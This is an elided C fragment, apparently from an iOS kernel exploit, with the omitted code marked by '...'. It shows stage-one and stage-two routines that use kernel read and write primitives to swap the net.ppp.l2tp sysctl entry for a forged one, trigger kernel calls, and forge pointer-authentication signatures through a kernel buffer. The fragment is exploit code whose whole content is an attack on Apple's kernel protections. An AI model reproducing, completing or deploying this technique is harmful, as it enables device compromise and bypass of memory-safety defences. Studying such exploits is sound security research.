...
stage1_init_kernel_pacxa_forging() {
    ...
    uint64_t paciza__l2tp_domain_module_start = rk64(
                                                              ADDRESS(paciza_pointer__l2tp_domain_module_start));
    uint64_t paciza__l2tp_domain_module_stop = rk64(
    ...
    kread(ADDRESS(sysctl__net_ppp_l2tp), sysctl__net_ppp_l2tp__data, SIZE(sysctl_oid));
    ...
    kwrite(ADDRESS(sysctl__net_ppp_l2tp), fake_sysctl_oid, SIZE(sysctl_oid));
    ...
    DEBUG_TRACE(1, "%s(): 0x%08x; l2tp_domain_inited = %d",
                ...
                rk32(ADDRESS(l2tp_domain_inited)));
    ...
    kwrite(ADDRESS(sysctl__net_ppp_l2tp), sysctl__net_ppp_l2tp__data, SIZE(sysctl_oid));
    ret = stage1_kernel_call_7(
...
stage2_kernel_forge_pacxa(uint64_t address, uint64_t context, bool instruction) {
    ...
    kwrite(kernel_pacxa_buffer, pacxa_buffer, sizeof(pacxa_buffer));
    ...
    uint64_t pacxa = rk64(result_address);
    return pacxa;
}
